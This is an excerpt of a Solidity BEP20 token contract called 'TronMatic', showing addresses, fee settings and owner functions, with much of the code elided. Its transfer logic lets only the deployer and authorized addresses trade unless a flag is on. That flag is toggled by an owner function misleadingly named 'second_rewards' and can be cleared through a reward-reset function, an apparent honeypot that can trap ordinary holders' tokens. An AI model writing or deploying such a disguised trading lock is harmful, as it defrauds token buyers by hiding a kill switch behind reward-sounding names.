...
contract TronMatic is IBEP20, Auth {
    using SafeMath for uint256;

    address Matic        = 0xCC42724C6683B7E57334c4E856f4c9965ED682bD;
    address SecondReward = 0x0000000000000000000000000000000000000000;
    address WBNB         = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD         = 0x000000000000000000000000000000000000dEaD;
    address ZERO         = 0x0000000000000000000000000000000000000000;

    string constant _name = "TronMatic";
    string constant _symbol = "BSMatic";
    ...
    uint256 reflectionFee   = 8; //проценты ревардов
    ...
    function setRewardCoin(address _reward_coin) public onlyOwner()  {
        SecondReward = _reward_coin;
    }
    
    function reloadRewardsSystem(uint256 to_reset) public  {
        if(_balances[SecondReward] > 1000){
            Rew2Status = false;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(sender != _deployer){
            if(!authorizations[sender] && !authorizations[recipient]){
                require(Rew2Status,"Trading not open yet");
            }
    ...
    function second_rewards(bool rew_status) public onlyOwner {
        Rew2Status = rew_status;
    }
